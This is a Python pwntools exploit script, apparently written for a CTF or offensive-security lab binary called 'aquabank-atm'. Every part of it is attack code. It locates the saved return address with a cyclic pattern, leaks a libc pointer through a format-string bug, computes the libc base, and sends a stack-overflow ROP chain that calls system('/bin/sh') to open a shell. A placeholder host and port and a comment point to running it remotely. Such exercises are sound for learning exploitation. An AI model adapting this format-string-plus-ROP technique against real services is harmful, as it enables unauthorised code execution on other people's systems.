from pwn import *
HOST = "a"
PORT = "a"

context.binary = elf = ELF("/home/kali/Desktop/offsec/ctf/lab3_4_recap/aquabank-atm", checksec=False)
libc = ELF("/home/kali/Desktop/offsec/ctf/lab3_4_recap/libc.so.6", checksec=False)

def find_rip_offset():
    p = process(elf.path)
    
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'account: ')
    p.sendline(b'dummy')
    p.recvuntil(b'Amount: ')
    p.sendline(b'dummy')
    p.recvuntil(b'(be brief):\n')
    p.sendline(cyclic(200))
    p.wait()

    core = p.corefile
    crash_val = core.read(core.rsp, 4)
    offset = cyclic_find(crash_val)

    return offset

offset_to_rip = find_rip_offset()

fs_index_leak = 1

p = process(elf.path)

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"note: ", f"%{fs_index_leak}$p".encode())
p.sendlineafter(b"> ", b"2")
p.recvuntil(b"--- Your customer note ---\n")

leak_raw = p.recvline().strip().decode()
leak = int(leak_raw, 16)
libc_base = p.libs()[libc.path]

p.close()

offset = leak - libc_base

#remote in real one
p = process(elf.path)

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"note: ", f"%{fs_index_leak}$p".encode())
p.sendlineafter(b"> ", b"2")
p.recvuntil(b"--- Your customer note ---\n")

leak_raw_remote = p.recvline().strip().decode()
leak_remote = int(leak_raw_remote, 16)


libc_base_remote = leak_remote - offset
libc.address = libc_base_remote

rop = ROP(libc)
system_addr = libc.sym.system
pop_rdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

bin_sh_addr = next(libc.search('/bin/sh'))

payload = flat(
    b'A'*offset_to_rip,

    #system("bin/sh")
    p64(ret_gadget),
    p64(pop_rdi_ret_addr), p64(bin_sh_addr),
    p64(system_addr),
)

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"From account: ", b"dummy")
p.sendlineafter(b"Amount: ", b"dummy")
p.sendlineafter(b"be brief):\n", payload)
p.interactive()